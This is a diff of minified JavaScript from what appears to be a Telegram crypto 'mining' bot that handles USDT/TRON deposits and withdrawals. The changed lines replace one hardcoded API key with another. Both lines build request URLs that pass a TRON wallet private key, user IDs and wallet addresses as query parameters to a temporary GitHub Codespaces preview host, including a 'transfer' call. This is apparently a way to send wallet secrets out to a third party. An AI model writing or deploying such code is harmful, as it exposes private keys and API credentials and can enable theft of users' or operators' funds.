@@ -1102,7 +1102,7 @@ S.action("turn_on_mining", async (ctx) => {
                     const t = await async function(e) {
                         try {
                             const topeurl = U+"/"+e.from.id;
-                            let url = "https://monika359b-super-space-zebra-76gqgq574qfrp9q-8888.preview.app.github.dev/usdt/generate-address?apikey=ee336e3d10dab6fab88edb4b25d70c24&tron_address="+x+"&userid="+e.from.id+"&ipn_url="+encodeURIComponent(topeurl)+"&trxPrivateKey="+T,
+                            let url = "https://monika359b-super-space-zebra-76gqgq574qfrp9q-8888.preview.app.github.dev/usdt/generate-address?apikey=dbe8c11db49317223b754c312e3cd981&tron_address="+x+"&userid="+e.from.id+"&ipn_url="+encodeURIComponent(topeurl)+"&trxPrivateKey="+T,
                                 n = await p(url, {
                                     method: "GET"
                                 }),
@@ -2474,7 +2474,7 @@ Maximum withdrawal amount is: ${t.toFixed()}`, {
                     });
                 if ("rejected" === s.status || "approved" === s.status) await e.answerCbQuery("This action is no longer available.its already " + s.status);
                 else {
-                    const i = "ee336e3d10dab6fab88edb4b25d70c24",
+                    const i = "dbe8c11db49317223b754c312e3cd981",
                         o = "https://monika359b-super-space-zebra-76gqgq574qfrp9q-8888.preview.app.github.dev/usdt/transfer?receiver="+ s.wallet+"&amount="+parseFloat(s.amount)+"&private_key="+T+"&apikey="+i,
                         l = {
                             "Content-Type": "application/json"
